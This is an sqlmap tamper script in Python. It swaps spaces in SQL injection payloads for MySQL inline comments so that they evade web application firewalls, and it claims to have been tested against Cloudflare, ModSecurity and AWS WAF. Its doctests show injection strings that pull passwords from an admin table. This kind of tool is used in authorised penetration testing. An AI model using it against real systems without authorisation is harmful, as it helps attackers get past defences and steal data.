#!/usr/bin/env python

"""
Copyright (c) 2006-2025 sqlmap developers (https://sqlmap.org/)
See the file 'LICENSE' for copying permission

Tamper script: cloudflare_space.py
Description: Replaces spaces with inline comments for WAF bypass
Author: Regaan
Priority: NORMAL
"""

from lib.core.enums import PRIORITY

__priority__ = PRIORITY.NORMAL

def dependencies():
    pass

def tamper(payload, **kwargs):
    """
    Replaces spaces with MySQL inline comments to bypass space-based WAF detection.
    
    This is a DETERMINISTIC transformation - same input always produces same output.
    
    Technique:
        Replaces all spaces with /**/ (MySQL inline comment)
        This is parsed as whitespace by MySQL but may bypass WAF space detection.
    
    Tested against:
        * Cloudflare WAF
        * ModSecurity
        * AWS WAF
    
    Notes:
        * Deterministic - always uses /**/ (not random comments)
        * Preserves SQL structure
        * Can be chained with other tamper scripts
    
    >>> tamper("SELECT * FROM users WHERE id=1")
    'SELECT/**/*/**/FROM/**/users/**/WHERE/**/id=1'
    
    >>> tamper("UNION SELECT password FROM admin")
    'UNION/**/SELECT/**/password/**/FROM/**/admin'
    """
    
    retVal = payload
    
    if payload:
        # Replace all spaces with inline comment
        # Using /**/ is more reliable than random variations
        retVal = retVal.replace(' ', '/**/')
    
    return retVal
